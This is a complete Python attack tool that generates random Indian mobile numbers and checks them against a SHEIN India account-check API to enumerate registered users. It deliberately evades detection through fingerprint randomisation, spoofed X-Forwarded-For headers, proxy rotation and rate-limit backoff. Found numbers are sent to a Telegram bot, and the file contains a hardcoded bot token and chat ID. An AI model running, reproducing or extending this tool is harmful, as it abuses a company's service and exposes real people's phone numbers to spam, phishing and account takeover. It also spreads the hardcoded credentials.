#!/usr/bin/env python3
"""
KOKU VPS HUNTER – Anti‑Detection SHEIN Number Checker
------------------------------------------------------
- Telegram bot with your credentials.
- PID file lock + global error handler for Conflict.
- Startup notification sent to Telegram.
- Commands: /monitor, /hits, /clear, /help.
- Hourly stats via background thread (no JobQueue dependency).
- Full fingerprint randomization, multi‑threading, proxy support.
"""

import os
import sys
import json
import time
import random
import threading
import urllib3
import binascii
import requests
import signal
import atexit
from datetime import datetime
from colorama import Fore, Style, init

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

# ==================== HARDCODED CREDENTIALS ====================
DEFAULT_BOT_TOKEN = "8636234396:AAHJEhiMqfRdAYdKZkctNsFhX-NZol6_tyI"
DEFAULT_CHAT_ID = "7811286022"

# ==================== ENVIRONMENT CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", DEFAULT_BOT_TOKEN)
CHAT_ID = os.environ.get("CHAT_ID", DEFAULT_CHAT_ID)
ENABLE_BOT = os.environ.get("ENABLE_BOT", "true").lower() == "true"

PROXY_LIST = os.environ.get("PROXY_LIST", "")
THREADS = int(os.environ.get("THREADS", "1"))
DELAY_BASE = float(os.environ.get("DELAY_BASE", "0.15"))
TOKEN_REFRESH_INTERVAL = int(os.environ.get("TOKEN_REFRESH", "50"))
STATS_FILE = os.environ.get("STATS_FILE", "finder_stats.json")
VALID_FILE = os.environ.get("VALID_FILE", "valid.txt")
PID_FILE = "bot.pid"

# ==================== PID LOCK ====================
def check_pid_file():
    if os.path.exists(PID_FILE):
        with open(PID_FILE, "r") as f:
            old_pid = int(f.read().strip())
        try:
            os.kill(old_pid, 0)  # Check if process exists
            print(f"{Fore.RED}[!] Another instance (PID {old_pid}) is already running. Exiting.{Style.RESET_ALL}")
            sys.exit(1)
        except OSError:
            # Stale PID file
            os.remove(PID_FILE)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

def remove_pid_file():
    if os.path.exists(PID_FILE) and int(open(PID_FILE).read()) == os.getpid():
        os.remove(PID_FILE)

# ==================== PROXY MANAGEMENT ====================
_proxies = [p.strip() for p in PROXY_LIST.split(",") if p.strip()] if PROXY_LIST else []
_proxy_lock = threading.Lock()

def get_random_proxy():
    if not _proxies:
        return None
    with _proxy_lock:
        proxy_str = random.choice(_proxies)
        return {"http": proxy_str, "https": proxy_str}

# ==================== FINGERPRINT RANDOMIZATION ====================
ANDROID_VERSIONS = ['11', '12', '13', '14']
DEVICE_MODELS = ['SM-G991B', 'SM-S911B', 'SM-A536B', 'SM-F721B', 'SM-M127B']
CLIENT_TYPES = ['30', '31', '32', '33', '34']
LANGUAGES = ['en-IN', 'en-US', 'en-GB', 'hi-IN']

def random_fingerprint():
    android_ver = random.choice(ANDROID_VERSIONS)
    model = random.choice(DEVICE_MODELS)
    client_type = f"Android/{random.choice(CLIENT_TYPES)}"
    language = random.choice(LANGUAGES)
    device_id = binascii.hexlify(os.urandom(8)).decode()
    ip_spoof = f"{random.randint(11,199)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(1,250)}"
    return {
        "User-Agent": f"SHEIN/1.0.8 (Linux; Android {android_ver}; {model} Build/...)",
        "Client_type": client_type,
        "Client_version": "1.0.8",
        "Accept-Language": language,
        "Ad_id": device_id,
        "X-Forwarded-For": ip_spoof,
        "X-Tenant-Id": "SHEIN",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
    }

# ==================== THREAD‑SAFE STATS ====================
_stats_lock = threading.Lock()

def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"checks": 0, "hits": 0, "hit_list": []}
    try:
        with open(STATS_FILE, "r") as f:
            content = f.read().strip()
            if not content:
                return {"checks": 0, "hits": 0, "hit_list": []}
            return json.loads(content)
    except (json.JSONDecodeError, IOError):
        return {"checks": 0, "hits": 0, "hit_list": []}

def save_stats(checks, hits, hit_list):
    with open(STATS_FILE, "w") as f:
        json.dump({"checks": checks, "hits": hits, "hit_list": hit_list}, f)

def add_check():
    with _stats_lock:
        stats = load_stats()
        stats["checks"] += 1
        save_stats(stats["checks"], stats["hits"], stats["hit_list"])

def add_hit(number):
    with _stats_lock:
        stats = load_stats()
        stats["hits"] += 1
        if number not in stats["hit_list"]:
            stats["hit_list"].append(number)
        save_stats(stats["checks"], stats["hits"], stats["hit_list"])
        with open(VALID_FILE, "a") as f:
            f.write(f"{number}\n")

def reset_stats():
    with _stats_lock:
        save_stats(0, 0, [])
        if os.path.exists(VALID_FILE):
            os.remove(VALID_FILE)

# ==================== TELEGRAM HELPERS ====================
def send_telegram(message, parse_mode=None):
    if not BOT_TOKEN or not CHAT_ID or not ENABLE_BOT:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    if parse_mode:
        data["parse_mode"] = parse_mode
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"{Fore.RED}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")

def format_stats_message():
    stats = load_stats()
    checks = stats["checks"]
    hits = stats["hits"]
    hit_rate = (hits / checks * 100) if checks > 0 else 0
    return (
        f"📊 *KOKU VPS HUNTER – MONITOR*\n"
        f"⏱ Time: {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 *Checks:* `{checks:,}`\n"
        f"✅ *Hits:* `{hits}`\n"
        f"📈 *Hit Rate:* `{hit_rate:.4f}%`\n"
    )

def format_hits_message():
    stats = load_stats()
    hit_list = stats["hit_list"]
    if hit_list:
        all_hits = "\n".join(hit_list)
        return f"📋 *Hit List (copy below):*\n```\n{all_hits}\n```"
    return "📭 No hits yet."

# ==================== API FUNCTIONS ====================
def get_client_token(session, proxy=None):
    url = "https://api.services.sheinindia.in/uaas/jwt/token/client"
    headers = random_fingerprint()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
    try:
        r = session.post(url, headers=headers, data=data, proxies=proxy, timeout=15, verify=False)
        if r.status_code == 200:
            js = r.json()
            return js.get("access_token") or js.get("data", {}).get("access_token")
    except:
        pass
    return None

def check_number(session, number, token, proxy=None):
    url = "https://api.services.sheinindia.in/uaas/accountCheck"
    headers = random_fingerprint()
    headers["Authorization"] = f"Bearer {token}"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = f"mobileNumber={number}"
    try:
        r = session.post(url, headers=headers, data=data, proxies=proxy, timeout=10, verify=False)
        if r.status_code == 200:
            js = r.json()
            return js.get("encryptedId") is not None
        elif r.status_code == 429:
            return "RATE_LIMIT"
        elif r.status_code in (401, 403):
            return "AUTH_ERROR"
    except:
        pass
    return False

# ==================== NUMBER GENERATOR ====================
def generate_indian_mobile():
    prefixes = ['99','98','97','96','93','90','88','89','87','70','79','78','63','62']
    return random.choice(prefixes) + str(random.randint(10000000, 99999999))

# ==================== WORKER THREAD ====================
def worker(thread_id):
    print(f"{Fore.CYAN}[Thread {thread_id}] Started.{Style.RESET_ALL}")
    session = requests.Session()
    token = None
    while token is None:
        proxy = get_random_proxy() if _proxies else None
        token = get_client_token(session, proxy)
        if not token:
            time.sleep(2)
    check_count = 0

    while True:
        try:
            proxy = get_random_proxy() if _proxies else None
            number = generate_indian_mobile()
            delay = DELAY_BASE + random.uniform(-0.05, 0.15)
            if delay < 0.05:
                delay = 0.05
            time.sleep(delay)
            if random.random() < 0.01:
                time.sleep(random.uniform(2, 5))

            result = check_number(session, number, token, proxy)
            add_check()

            if result is True:
                add_hit(number)
                print(f"{Fore.GREEN}[Thread {thread_id}] HIT: {number}{Style.RESET_ALL}")
            elif result == "RATE_LIMIT":
                print(f"{Fore.YELLOW}[Thread {thread_id}] Rate limit – backing off...{Style.RESET_ALL}")
                time.sleep(random.uniform(2, 5))
            elif result == "AUTH_ERROR":
                print(f"{Fore.YELLOW}[Thread {thread_id}] Auth error – refreshing token...{Style.RESET_ALL}")
                token = get_client_token(session, proxy)
                if not token:
                    time.sleep(5)
            else:
                print(f"{Fore.RED}[Thread {thread_id}] BAD: {number}{Style.RESET_ALL}")

            check_count += 1
            if check_count % TOKEN_REFRESH_INTERVAL == 0:
                new_token = get_client_token(session, proxy)
                if new_token:
                    token = new_token
                    print(f"{Fore.CYAN}[Thread {thread_id}] Token refreshed.{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[Thread {thread_id}] Error: {e}{Style.RESET_ALL}")
            time.sleep(2)

# ==================== HOURLY STATS THREAD ====================
def hourly_stats_loop():
    """Send stats every hour via Telegram."""
    while True:
        time.sleep(3600)  # 1 hour
        if ENABLE_BOT:
            send_telegram(format_stats_message(), parse_mode='Markdown')

# ==================== TELEGRAM BOT ====================
if ENABLE_BOT:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
    from telegram.error import Conflict

    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle errors inside the polling loop."""
        if isinstance(context.error, Conflict):
            print(f"{Fore.RED}[BOT] Conflict detected: another instance is using this bot token. Exiting.{Style.RESET_ALL}")
            remove_pid_file()
            os._exit(1)
        else:
            print(f"{Fore.RED}[BOT] Unhandled error: {context.error}{Style.RESET_ALL}")

    async def monitor_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(format_stats_message(), parse_mode='Markdown')

    async def hits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(format_hits_message(), parse_mode='Markdown')

    async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        reset_stats()
        await update.message.reply_text("🧹 Stats reset and valid.txt cleared.")

    async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
*KOKU VPS HUNTER – Commands*

/monitor – Show total checks, hits, and hit rate
/hits     – Get the full list of found numbers (copyable)
/clear    – Reset all stats and delete valid.txt
/help     – Show this help message

The bot scans numbers 24/7 with anti‑detection measures.
        """
        await update.message.reply_text(help_text, parse_mode='Markdown')

    def start_bot():
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_error_handler(error_handler)
        app.add_handler(CommandHandler("monitor", monitor_command))
        app.add_handler(CommandHandler("hits", hits_command))
        app.add_handler(CommandHandler("clear", clear_command))
        app.add_handler(CommandHandler("help", help_command))
        print(f"{Fore.GREEN}[BOT] Telegram bot running in main thread...{Style.RESET_ALL}")
        try:
            app.run_polling()
        except Conflict as e:
            print(f"{Fore.RED}[BOT] Conflict error at startup: {e}. Another instance is using this bot token. Exiting.{Style.RESET_ALL}")
            remove_pid_file()
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[BOT] Polling error: {e}{Style.RESET_ALL}")
            time.sleep(5)
            start_bot()  # restart on non‑conflict errors
else:
    def start_bot():
        print(f"{Fore.YELLOW}[BOT] Telegram bot disabled.{Style.RESET_ALL}")
        while True:
            time.sleep(60)

# ==================== MAIN ====================
def main():
    # Check for existing instance
    check_pid_file()

    # Ensure PID file is removed on exit
    atexit.register(remove_pid_file)
    signal.signal(signal.SIGTERM, lambda signum, frame: sys.exit(0))
    signal.signal(signal.SIGINT, lambda signum, frame: sys.exit(0))

    print(f"{Fore.GREEN}╔════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.GREEN}║     KOKU VPS HUNTER v1.5          ║{Style.RESET_ALL}")
    print(f"{Fore.GREEN}╚════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"Threads: {THREADS}")
    print(f"Base delay: {DELAY_BASE}s")
    print(f"Proxies: {'Yes (' + str(len(_proxies)) + ')' if _proxies else 'No'}")
    print(f"Telegram bot: {'Enabled' if ENABLE_BOT else 'Disabled'}")

    # Start hourly stats thread (if bot enabled)
    if ENABLE_BOT:
        stats_thread = threading.Thread(target=hourly_stats_loop, daemon=True)
        stats_thread.start()

    # Send startup notification
    if ENABLE_BOT:
        send_telegram("✅ *KOKU VPS HUNTER started.*\nMonitoring enabled.", parse_mode='Markdown')

    # Start worker threads
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(i+1,), daemon=True)
        t.start()
        time.sleep(0.5)

    # Start Telegram bot (blocks main thread)
    start_bot()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Stopped by user.{Style.RESET_ALL}")
        remove_pid_file()
        sys.exit(0)
